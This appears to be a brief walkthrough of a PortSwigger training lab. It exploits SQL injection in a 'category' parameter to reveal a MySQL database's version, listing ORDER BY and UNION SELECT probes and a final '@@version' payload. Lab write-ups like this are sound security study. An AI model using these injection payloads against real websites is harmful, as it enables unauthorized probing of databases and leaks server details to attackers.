**Lab:** SQL injection attack, querying the database type and version on MySQL and Microsoft

**Vulnerability:** SQL injection revealing database version

**Vulnerable Parameter:** category (GET request)

**Impact:** Information disclosure (database version exposure)

**Technique:** UNION attack with database-specific queries

**URL:** https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

## Steps:
1. Find category parameter
2. Open Burp Suite and send request to Repeater
3. Test with `'` → Internal Server Error
4. Comment out with `--` → Internal Server Error (not working)
5. Try MySQL comment `#` → 200 OK (confirms MySQL)
6. Find column count: `' ORDER BY 2#` works, `' ORDER BY 3#` fails (2 columns)
7. Test string columns: `' UNION SELECT 'a','b'#` → works (both columns accept strings)
8. Get version: `' UNION SELECT NULL,@@version#`
9. Lab solved

## Payload:

' union select null, @@version#


## Notes:
- we get the @@version from sqli cheat sheet
- Used PortSwigger's SQL injection cheat sheet for reference
